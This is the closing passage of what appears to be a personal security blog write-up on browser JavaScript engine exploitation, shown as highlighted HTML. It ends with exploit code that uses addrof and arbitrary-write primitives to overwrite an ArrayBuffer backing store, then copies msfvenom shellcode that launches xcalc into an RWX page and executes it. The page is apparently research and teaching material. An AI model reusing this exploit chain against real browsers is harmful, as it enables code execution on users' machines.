</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">shellcode</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">shellcode</span>[<span style="color:#a6e22e">i</span>], <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span><span style="color:#f92672">=</span>[                 
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x90909090</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x90909090</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x782fb848</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x636c6163</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x48500000</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x73752fb8</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x69622f72</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x8948506e</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0xc03148e7</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x89485750</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0xd23148e6</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x3ac0c748</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x50000030</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x4944b848</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x414c5053</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x48503d59</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x3148e289</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x485250c0</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0xc748e289</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x00003bc0</span>,
</span></span><span style="display:flex;"><span>	    <span style="color:#ae81ff">0x050f00</span>
</span></span><span style="display:flex;"><span>	];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">copy_shellcode</span>(<span style="color:#a6e22e">rwx_page_addr</span>, <span style="color:#a6e22e">shellcode</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">f</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exploit</span>();</span></span></code></pre></div>
<img src="/2021-12-25-112106_948x623_scrot.png#center" alt=""></p>


    </div>
</div>
<div class="row align-center">
    <div class="col">
        <a href="https://ulexec.github.io" class="btn btn-primary btn-lg">Back to Home</a>
    </div>
</div>


    </div><footer class="container">
    <hr class="soften" />
    <p class="text-center">
    Content Licensed under <a href="">MIT</a> | 


&copy;&nbsp;



    Ignacio Sanmillan



<span id="thisyear">
    2023
</span>




</p>
    <p class="text-center">
        

        
            <a href="https://twitter.com/ulexec">Twitter</a>
        

        
            <a href="https://linkedin.com/in/ignacio-sanmillan-1aa244b8">Linkedin</a>
        

        
            <a href="https://github.com/ulexec">GitHub</a>
        

        
    </p>
</footer>
</body><link rel="stylesheet" href="/css/bootstrap.min.css">
<link rel="stylesheet" href="/css/bootstrap-theme.min.css">
<link rel="stylesheet" href="/css/style.css"> 
<script src="/js/jquery.js"></script>
<script src="/js/bootstrap.min.js"></script>

<script>
    
    function ThisYear() {
        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
    };
</script>
<script>	
	
(function(){
  _386.magicCursor();
  _386.scrollLock();
  $('[data-toggle="tooltip"]').tooltip();
  $('[data-toggle="popover"]').popover();

  $(window).scroll(function() {
    var top = $(document).scrollTop();
    if(top > 50)
      $('#home > .navbar').removeClass('navbar-transparent');
    else
      $('#home > .navbar').addClass('navbar-transparent');
  });

  $("a[href='#']").click(function(e) {
    e.preventDefault();
  });

})();</script></html>